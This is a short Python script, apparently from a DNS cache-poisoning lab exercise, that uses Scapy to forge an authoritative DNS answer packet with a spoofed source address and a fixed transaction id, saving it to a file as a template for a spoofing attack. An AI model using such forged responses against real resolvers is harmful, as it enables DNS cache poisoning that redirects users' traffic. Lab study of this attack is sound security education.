from scapy.all import *
from scapy.layers.dns import DNSQR
from scapy.layers.dns import DNSRR
from scapy.layers.dns import DNS
from scapy.layers.inet import IP
from scapy.layers.inet import UDP

if __name__ == "__main__":
# Construct the DNS header and payload
    name = 'twysw.example.com'
    Qdsec = DNSQR(qname=name)
    Anssec = DNSRR(rrname=name, type='A', rdata='1.1.2.2', ttl=259200)
    dns = DNS(id=0xAAAA, aa=1, rd=0, qr=1,
    qdcount=1, ancount=1, nscount=0, arcount=0,
    qd=Qdsec, an=Anssec)
    # Construct the IP, UDP headers, and the entire packet
    # ip = IP(dst='10.9.0.53', src='10.9.0.153', chksum=0)
    ip = IP(dst='127.0.0.1', src='10.9.0.153', chksum=0)
    udp = UDP(dport=33333, sport=53, chksum=0)
    pkt = ip/udp/dns
    # Save the packet to a file
    with open('ip_resp.bin', 'wb') as f:
        f.write(bytes(pkt))

    # send(pkt)